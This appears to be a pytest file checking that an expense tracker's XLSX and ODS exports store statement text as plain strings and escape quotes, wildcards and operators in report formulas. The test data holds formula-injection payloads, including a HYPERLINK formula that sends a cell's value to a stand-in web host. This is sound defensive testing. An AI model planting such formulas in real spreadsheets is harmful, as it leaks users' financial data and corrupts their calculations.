"""Statement text in the spreadsheet reports.

Descriptions come from bank statements and notes from the user: whatever
they contain, they are data. They must reach the cells as text and must
not change the formulas that mention them.
"""
from __future__ import annotations

import pytest
from odf.opendocument import load as load_ods
from odf.table import Table, TableCell, TableRow
from odf.text import P
from openpyxl import load_workbook

from expense_tracker.ods import generate_ods
from expense_tracker.xlsx import generate_xlsx

from .conftest import add_transaction

FORMULA = '=HYPERLINK("http://example.org/?"&Data!F2,"click")'


def _xlsx(db, tmp_path):
    path = tmp_path / "report.xlsx"
    generate_xlsx(db, tmp_path / "rules.csv", path, tmp_path / "notes.csv")
    return load_workbook(path)


def _xlsx_row(ws, label: str) -> int:
    for row in ws.iter_rows(min_col=1, max_col=1):
        if row[0].value == label:
            return row[0].row
    raise AssertionError(f"{label!r} not found in {ws.title}")


def _ods(db, tmp_path):
    path = tmp_path / "report.ods"
    generate_ods(db, tmp_path / "rules.csv", path, tmp_path / "notes.csv")
    return load_ods(str(path))


def _ods_cells(doc, sheet_name: str, label: str) -> list:
    sheet = next(
        s
        for s in doc.spreadsheet.getElementsByType(Table)
        if s.getAttribute("name") == sheet_name
    )
    for row in sheet.getElementsByType(TableRow):
        cells = row.getElementsByType(TableCell)
        if cells and "".join(str(p) for p in cells[0].getElementsByType(P)) == label:
            return cells
    raise AssertionError(f"{label!r} not found in {sheet_name}")


class TestXlsxCellsHoldText:
    """openpyxl stores any string that starts with "=" as a formula."""

    @pytest.fixture
    def workbook(self, test_db, tmp_path):
        add_transaction(
            test_db, "2026-01-10", FORMULA, 10.0, category="=Misc", notes="=1+1"
        )
        (tmp_path / "rules.csv").write_text(
            "pattern,match_field,category,subcategory,payment_type\n"
            "=SHOP,description,=Misc,,\n",
            encoding="utf-8",
        )
        return _xlsx(test_db, tmp_path)

    def test_description_and_notes_are_text(self, workbook):
        ws = workbook["Data"]
        for column in ("D", "E", "H", "R"):  # raw, clean, category, notes
            cell = ws[f"{column}2"]
            assert cell.data_type == "s", f"{column}2 is a formula: {cell.value}"
        assert ws["E2"].value == FORMULA
        assert ws["R2"].value == "=1+1"

    def test_rule_pattern_is_text(self, workbook):
        cell = workbook["Rules"]["A2"]
        assert (cell.data_type, cell.value) == ("s", "=SHOP")

    @pytest.mark.parametrize(
        "sheet, label",
        [
            ("Dashboard", "=Misc"),
            ("Dashboard", FORMULA),
            ("Category Breakdown", "=Misc"),
            ("Subcategory Breakdown", "=Misc"),
        ],
    )
    def test_labels_of_analysis_sheets_are_text(self, workbook, sheet, label):
        ws = workbook[sheet]
        assert ws.cell(row=_xlsx_row(ws, label), column=1).data_type == "s"

    def test_category_heading_of_monthly_summary_is_text(self, workbook):
        cell = workbook["Monthly Summary"]["B1"]
        assert (cell.data_type, cell.value) == ("s", "=Misc")



class TestOdsFormulasQuoteNames:
    """A name is written into the formulas as a string: a double quote in
    it must be doubled, or the rest of the name becomes formula text."""

    @pytest.fixture
    def doc(self, test_db, tmp_path):
        add_transaction(test_db, "2026-01-10", 'A")+1+("', 10.0,
                        category='Kids "R" Us', subcategory='7" tablets')
        return _ods(test_db, tmp_path)

    def test_data_cell_is_a_string(self, doc):
        sheet = next(
            s for s in doc.spreadsheet.getElementsByType(Table)
            if s.getAttribute("name") == "Data"
        )
        cells = sheet.getElementsByType(TableRow)[1].getElementsByType(TableCell)
        assert str(cells[4]) == 'A")+1+("'
        assert cells[4].getAttribute("valuetype") == "string"
        assert cells[4].getAttribute("formula") is None

    def test_merchant_name_stays_inside_its_string(self, doc):
        cells = _ods_cells(doc, "Dashboard", 'A")+1+("')
        assert cells[1].getAttribute("formula") == (
            'of:=SUMPRODUCT(([.Data.E2:.Data.E2]="A"")+1+(""")'
            '*([.Data.G2:.Data.G2]="out")*[.Data.F2:.Data.F2])'
        )
        assert cells[2].getAttribute("formula") == (
            'of:=SUMPRODUCT(([.Data.E2:.Data.E2]="A"")+1+(""")'
            '*([.Data.G2:.Data.G2]="out"))'
        )

    @pytest.mark.parametrize(
        "sheet, label, column",
        [
            ("Dashboard", 'Kids "R" Us', 1),
            ("Dashboard", 'Kids "R" Us', 2),
            ("Category Breakdown", 'Kids "R" Us', 1),
            ("Category Breakdown", 'Kids "R" Us', 4),
            ("Subcategory Breakdown", 'Kids "R" Us', 2),
            ("Subcategory Breakdown", 'Kids "R" Us', 3),
            ("Subcategory Breakdown", 'Kids "R" Us', 4),
            ("Monthly Summary", "2026-01", 1),
        ],
    )
    def test_category_name_stays_inside_its_string(self, doc, sheet, label, column):
        formula = _ods_cells(doc, sheet, label)[column].getAttribute("formula")
        assert '="Kids ""R"" Us")' in formula
        assert '"Kids "R" Us"' not in formula

    def test_subcategory_name_stays_inside_its_string(self, doc):
        cells = _ods_cells(doc, "Subcategory Breakdown", 'Kids "R" Us')
        for column in (2, 4):
            assert '[.Data.I2:.Data.I2]="7"" tablets")' in (
                cells[column].getAttribute("formula")
            )


class TestXlsxCriteriaMatchTheNameOnly:
    """In a SUMIFS/COUNTIFS criterion * and ? are wildcards, a leading
    =, < or > is an operator and a double quote ends the string."""

    @pytest.fixture
    def workbook(self, test_db, tmp_path):
        add_transaction(test_db, "2026-01-10", "PAYPAL *SPOTIFY?", 10.0,
                        category='Kids "R" Us', subcategory="Toys*")
        add_transaction(test_db, "2026-01-11", "=1+1", 5.0, category="A~B")
        return _xlsx(test_db, tmp_path)

    def test_wildcards_in_a_merchant_name_are_escaped(self, workbook):
        ws = workbook["Dashboard"]
        row = _xlsx_row(ws, "PAYPAL *SPOTIFY?")
        assert ws.cell(row=row, column=2).value == (
            '=SUMIFS(Data!F:F,Data!E:E,"PAYPAL ~*SPOTIFY~?",Data!G:G,"out")'
        )
        assert ws.cell(row=row, column=3).value == (
            '=COUNTIFS(Data!E:E,"PAYPAL ~*SPOTIFY~?",Data!G:G,"out")'
        )

    def test_merchant_that_starts_with_an_operator_is_matched_as_text(self, workbook):
        ws = workbook["Dashboard"]
        row = _xlsx_row(ws, "=1+1")
        assert ws.cell(row=row, column=2).value == (
            '=SUMIFS(Data!F:F,Data!E:E,"==1+1",Data!G:G,"out")'
        )

    def test_quotes_in_a_category_name_are_doubled(self, workbook):
        ws = workbook["Category Breakdown"]
        row = _xlsx_row(ws, 'Kids "R" Us')
        assert ws.cell(row=row, column=2).value == (
            '=SUMIFS(Data!F:F,Data!H:H,"Kids ""R"" Us",Data!G:G,"out")'
            '-SUMIFS(Data!F:F,Data!H:H,"Kids ""R"" Us",Data!G:G,"in")'
        )
        assert ws.cell(row=row, column=5).value == (
            '=COUNTIFS(Data!H:H,"Kids ""R"" Us",Data!G:G,"out")'
        )

    def test_tilde_in_a_category_name_is_escaped(self, workbook):
        ws = workbook["Dashboard"]
        row = _xlsx_row(ws, "A~B")
        assert ws.cell(row=row, column=3).value == (
            '=COUNTIFS(Data!H:H,"A~~B",Data!G:G,"out")'
        )

    def test_subcategory_is_escaped(self, workbook):
        ws = workbook["Subcategory Breakdown"]
        row = _xlsx_row(ws, 'Kids "R" Us')
        assert ws.cell(row=row, column=5).value == (
            '=COUNTIFS(Data!H:H,"Kids ""R"" Us",Data!I:I,"Toys~*",Data!G:G,"out")'
        )
